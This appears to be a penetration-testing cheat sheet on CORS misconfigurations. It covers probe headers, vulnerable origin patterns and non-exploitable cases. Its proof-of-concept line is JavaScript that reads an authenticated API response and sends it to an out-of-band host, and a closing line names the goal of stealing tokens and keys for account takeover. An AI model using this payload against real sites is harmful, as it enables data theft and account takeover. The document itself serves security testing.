## CORS Misconfiguration
Where: any API returning `Access-Control-Allow-Origin` (ACAO). Send `Origin: https://evil.com` and inspect response ACAO/ACAC headers.
Vulnerable patterns:
- Reflected origin: `ACAO: https://evil.com` + `Access-Control-Allow-Credentials: true` -> your JS on evil.com can read authenticated responses (creds sent). Critical.
- Null origin: `ACAO: null` + ACAC true -> use a sandboxed iframe (`<iframe sandbox="allow-scripts" srcdoc=...>`) whose origin is `null`.
- Weak regex: `allowed.com.evil.com`, `evilallowed.com`, `allowed.com.evil` accepted; trailing/prefix match, `.` treated literally, `http://allowed.com` when only https intended.
- Pre-domain/subdomain: any `*.allowed.com` reflected -> chain a subdomain XSS/takeover to a trusted origin.
Non-exploitable: `ACAO: *` WITHOUT credentials leaks only public data (note but low). `*` + credentials is disallowed by browsers.
PoC: host JS that `fetch('https://target/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://OOB/?'+btoa(d)))`.
Escalate: exfiltrate account data / CSRF tokens / API keys -> ATO.
